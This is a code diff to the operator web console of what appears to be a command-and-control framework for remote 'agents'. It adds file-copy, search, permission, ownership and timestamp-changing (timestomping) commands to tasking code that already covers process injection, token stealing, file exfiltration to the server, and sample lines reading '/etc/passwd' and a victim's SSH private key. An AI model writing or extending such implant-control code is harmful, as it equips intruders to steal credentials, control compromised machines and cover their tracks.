@@ -7385,6 +7385,13 @@ const AC_COMMANDS = [
   ['mkdir','mkdir <path>'],
   ['rm','rm <path>'],
   ['cat','cat <file>'],
+  ['cp','cp <src> <dst>'],
+  ['mv','mv <src> <dst>'],
+  ['grep','grep <pattern> <path>'],
+  ['mount','mount — listar puntos montados'],
+  ['chmod','chmod <mode> <path>'],
+  ['chown','chown <owner[:group]> <path>'],
+  ['chtimes','chtimes <RFC3339> <path>'],
   ['env','variables de entorno'],
   // TRANSFERENCIA
   ['download','download <ruta_remota>'],
@@ -7805,6 +7812,13 @@ function consoleKey(e) {
       if (e.key !== 'Tab') { /* Tab just completes, Enter falls through only if no selection */ }
       return;
     }
+    if (e.key === 'ArrowRight') {
+      e.preventDefault();
+      if (acIdx >= 0) consoleAcPick(acIdx);
+      else if (acMatches.length === 1) consoleAcPick(0);
+      else if (acMatches.length > 1) consoleAcHighlight(0);
+      return;
+    }
     if (e.key === 'Escape') { consoleAcClose(); e.preventDefault(); return; }
   } else if (e.key === 'Tab') {
     e.preventDefault();
@@ -7812,6 +7826,14 @@ function consoleKey(e) {
     if (acMatches.length === 1) { consoleAcPick(0); }
     else if (acMatches.length > 1) { consoleAcHighlight(0); }
     return;
+  } else if (e.key === 'ArrowRight' && !input.value) {
+    const hint = (input.placeholder || '').split(/[|·]/)[0].trim();
+    if (hint && !hint.endsWith('…')) {
+      input.value = hint;
+      consoleAcUpdate();
+      e.preventDefault();
+      return;
+    }
   }
 
   const hist = consoleHistory[id] || [];
@@ -7878,7 +7900,12 @@ function getHelpHTML_en(isWin) {
 <span class="console-section">FILESYSTEM</span>
   pwd / cd &lt;path&gt; / ls [path]        current dir / change / list
   mkdir &lt;path&gt; / rm &lt;path&gt;           create / delete
-  cat &lt;file&gt; / env                   read file / environment vars
+  cat &lt;file&gt; / cp &lt;src&gt; &lt;dst&gt;         read / copy
+  mv &lt;src&gt; &lt;dst&gt; / grep &lt;pat&gt; &lt;path&gt; move / search text
+  mount / chmod &lt;mode&gt; &lt;path&gt;        list mounts / permissions
+  chown &lt;owner[:group]&gt; &lt;path&gt;       change ownership (POSIX)
+  chtimes &lt;RFC3339&gt; &lt;path&gt;            change modification time
+  env                                  environment vars
 
 <span class="console-section">FILE TRANSFER</span>
   download &lt;remote_path&gt;             agent → server
@@ -8014,7 +8041,12 @@ function getHelpHTML_es(isWin) {
 <span class="console-section">FILESYSTEM</span>
   pwd / cd &lt;ruta&gt; / ls [ruta]        directorio actual / cambiar / listar
   mkdir &lt;ruta&gt; / rm &lt;ruta&gt;           crear / borrar
-  cat &lt;archivo&gt; / env                leer archivo / variables de entorno
+  cat &lt;archivo&gt; / cp &lt;src&gt; &lt;dst&gt;     leer / copiar
+  mv &lt;src&gt; &lt;dst&gt; / grep &lt;pat&gt; &lt;ruta&gt; mover / buscar texto
+  mount / chmod &lt;modo&gt; &lt;ruta&gt;        puntos montados / permisos
+  chown &lt;owner[:group]&gt; &lt;ruta&gt;       cambiar propietario (POSIX)
+  chtimes &lt;RFC3339&gt; &lt;ruta&gt;            cambiar fecha de modificación
+  env                                  variables de entorno
 
 <span class="console-section">TRANSFERENCIA</span>
   download &lt;ruta_remota&gt;             agente → servidor
@@ -8876,6 +8908,28 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   cat /etc/passwd
   cat C:\\Users\\victim\\.ssh\\id_rsa`,
 
+  'cp': `<b>cp</b> — copiar archivos o directorios
+  <span class="console-section">USO</span>
+  cp &lt;origen&gt; &lt;destino&gt;`,
+  'mv': `<b>mv</b> — mover o renombrar archivos
+  <span class="console-section">USO</span>
+  mv &lt;origen&gt; &lt;destino&gt;`,
+  'grep': `<b>grep</b> — buscar texto recursivamente
+  <span class="console-section">USO</span>
+  grep &lt;patrón&gt; &lt;ruta&gt;`,
+  'mount': `<b>mount</b> — listar puntos de montaje
+  <span class="console-section">USO</span>
+  mount`,
+  'chmod': `<b>chmod</b> — cambiar permisos POSIX
+  <span class="console-section">USO</span>
+  chmod &lt;modo octal&gt; &lt;ruta&gt;`,
+  'chown': `<b>chown</b> — cambiar propietario POSIX
+  <span class="console-section">USO</span>
+  chown &lt;usuario[:grupo]&gt; &lt;ruta&gt;`,
+  'chtimes': `<b>chtimes</b> — cambiar fecha de modificación
+  <span class="console-section">USO</span>
+  chtimes &lt;RFC3339&gt; &lt;ruta&gt;`,
+
   'env': `<b>env</b> — listar variables de entorno del proceso
 
   <span class="console-section">USO</span>
@@ -9677,6 +9731,28 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   cat /etc/passwd
   cat C:\\Users\\victim\\.ssh\\id_rsa`,
 
+  'cp': `<b>cp</b> — copy files or directories
+  <span class="console-section">USAGE</span>
+  cp &lt;source&gt; &lt;destination&gt;`,
+  'mv': `<b>mv</b> — move or rename files
+  <span class="console-section">USAGE</span>
+  mv &lt;source&gt; &lt;destination&gt;`,
+  'grep': `<b>grep</b> — recursively search text
+  <span class="console-section">USAGE</span>
+  grep &lt;pattern&gt; &lt;path&gt;`,
+  'mount': `<b>mount</b> — list mount points
+  <span class="console-section">USAGE</span>
+  mount`,
+  'chmod': `<b>chmod</b> — change POSIX permissions
+  <span class="console-section">USAGE</span>
+  chmod &lt;octal mode&gt; &lt;path&gt;`,
+  'chown': `<b>chown</b> — change POSIX ownership
+  <span class="console-section">USAGE</span>
+  chown &lt;owner[:group]&gt; &lt;path&gt;`,
+  'chtimes': `<b>chtimes</b> — change modification time
+  <span class="console-section">USAGE</span>
+  chtimes &lt;RFC3339&gt; &lt;path&gt;`,
+
   'env': `<b>env</b> — list process environment variables
 
   <span class="console-section">USAGE</span>
@@ -9907,6 +9983,37 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'cat':   taskType='CAT'; taskArgs=args; break;
     case 'mkdir': taskType='MKDIR'; taskArgs=args; break;
     case 'rm':    taskType='RM'; taskArgs=args; break;
+    case 'cp': case 'mv': {
+      const fp = args.trim().split(/\s+/);
+      if (fp.length < 2) { addConsoleOutput(`uso: ${cmd} <src> <dst>`, '', null); return; }
+      taskType = cmd.toUpperCase();
+      taskArgs = JSON.stringify({src: fp[0], dst: fp.slice(1).join(' ')});
+      break;
+    }
+    case 'grep': {
+      const gp = args.trim().split(/\s+/);
+      if (gp.length < 2) { addConsoleOutput('uso: grep <pattern> <path>', '', null); return; }
+      taskType = 'GREP';
+      taskArgs = JSON.stringify({pattern: gp[0], path: gp.slice(1).join(' '), recursive: true});
+      break;
+    }
+    case 'mount': taskType='MOUNT'; taskArgs=args.trim(); break;
+    case 'chmod': {
+      const cp = args.trim().split(/\s+/);
+      if (cp.length < 2) { addConsoleOutput('uso: chmod <mode> <path>', '', null); return; }
+      taskType='CHMOD'; taskArgs=JSON.stringify({mode:cp[0], path:cp.slice(1).join(' ')}); break;
+    }
+    case 'chown': {
+      const op = args.trim().split(/\s+/);
+      if (op.length < 2) { addConsoleOutput(`uso: chown <owner[:group]> <path>`, '', null); return; }
+      const og = op[0].split(':');
+      taskType='CHOWN'; taskArgs=JSON.stringify({owner:og[0], group:og[1]||'', path:op.slice(1).join(' ')}); break;
+    }
+    case 'chtimes': {
+      const tp = args.trim().split(/\s+/);
+      if (tp.length < 2) { addConsoleOutput('uso: chtimes <RFC3339> <path>', '', null); return; }
+      taskType='CHTIMES'; taskArgs=JSON.stringify({mtime:tp[0], path:tp.slice(1).join(' ')}); break;
+    }
     case 'env':   taskType='ENV'; break;
     case 'screenshot': taskType='SCREENSHOT'; break;
     case 'cleanup':    taskType='CLEANUP'; break;
